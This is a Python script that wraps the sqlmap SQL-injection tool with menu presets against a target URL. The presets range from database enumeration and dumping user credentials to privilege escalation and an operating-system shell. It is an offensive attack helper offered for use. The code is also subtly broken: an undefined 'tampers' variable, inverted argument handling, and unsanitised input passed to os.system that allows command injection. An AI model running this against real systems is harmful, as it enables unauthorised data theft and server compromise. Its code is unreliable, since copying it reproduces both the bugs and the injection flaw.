#!/usr/bin/python3
import sys
from os import system
# Author: Mili
# Python: > 3.5.3
def inject(url, switches, tampers, path):
    if tampers:
        system(f"./{path} {switches} --tamper={','.join(tampers)} -u {url}")
    else:
        system(f"./{path} {switches} -u {url}")

def main(target, path):
    injections= {'initial test':"--hostname --current-db --current-user --is-dba --privileges --roles",
                 'basic enumeration':"--dbs --schema --tables --count --comments",
                 'full enumeration':"--dbs --tables --count --columns",
                 'check credentials':"--users --passwords",
                 'exploitation':"--priv-esc --os-shell --os-bof",
                 'interactive':"--sqlmap-shell",
                 }
    tamper = [t for t in input("\033[33mList tamper scripts to enable (if any), delimited by a comma: ").split(",")]
    print("\033[95m --Injection Name: Switches--")
    for x,y in injections.items():
        print(f"\033[94m{x}: \033[92m{y}")
    while True:
        enabled = input("\033[33mEnter the injections you wish to run, delimited by a comma: ").split(",")
        if any(k not in injections.keys() for k in enabled):
            print("\033[91m Invalid injection name detected.")
            continue
        break
    for x in enabled:
        inject(target, injections[x], tampers, path)
if __name__ == "__main__":
    try:
        if len(sys.argv) != 3:
            path = 'sqlmap.py'
        else:
            path = sys.argv[3]
        main(sys.argv[1], path)
    except IndexError:
        print(f"\033[91m Usage: {sys.argv[0]} <target url> <path to sqlmap.py, defaults to current directory>")
